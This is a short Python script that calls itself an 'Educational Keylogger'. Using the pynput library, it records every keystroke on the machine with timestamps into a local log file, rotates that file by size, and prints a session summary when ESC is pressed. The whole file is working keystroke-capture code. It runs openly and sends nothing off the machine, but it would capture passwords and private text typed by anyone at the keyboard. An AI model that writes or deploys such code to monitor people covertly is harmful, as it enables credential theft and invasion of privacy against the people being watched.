import os
import datetime
from pynput import keyboard

LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
MAX_LOG_SIZE = 1024 * 50  # 50 KB

key_count = 0
start_time = datetime.datetime.now()


# Ensure log directory exists
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)


def rotate_log():
    if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > MAX_LOG_SIZE:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        os.rename(LOG_FILE, os.path.join(LOG_DIR, f"keylog_{timestamp}.txt"))


def format_key(key):
    if key == keyboard.Key.space:
        return " "
    elif key == keyboard.Key.enter:
        return "\n"
    elif key == keyboard.Key.tab:
        return "[TAB]"
    elif key == keyboard.Key.backspace:
        return "[BACKSPACE]"
    elif key == keyboard.Key.shift:
        return "[SHIFT]"
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        return "[CTRL]"
    elif key == keyboard.Key.esc:
        return "[ESC]"
    else:
        return None


def on_press(key):
    global key_count
    key_count += 1

    rotate_log()

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        log_entry = key.char
    except AttributeError:
        formatted = format_key(key)
        if formatted:
            log_entry = formatted
        else:
            log_entry = f"[{key}]"

    with open(LOG_FILE, "a") as f:
        f.write(f"{timestamp} | {log_entry}")


def on_release(key):
    if key == keyboard.Key.esc:
        end_time = datetime.datetime.now()
        duration = (end_time - start_time).seconds

        print("\nSession Summary")
        print("------------------------")
        print(f"Start Time : {start_time}")
        print(f"End Time   : {end_time}")
        print(f"Duration   : {duration} seconds")
        print(f"Total Keys : {key_count}")
        print("Log saved in /logs directory")

        return False


print("Educational Keylogger Started")
print("Press ESC to stop.\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
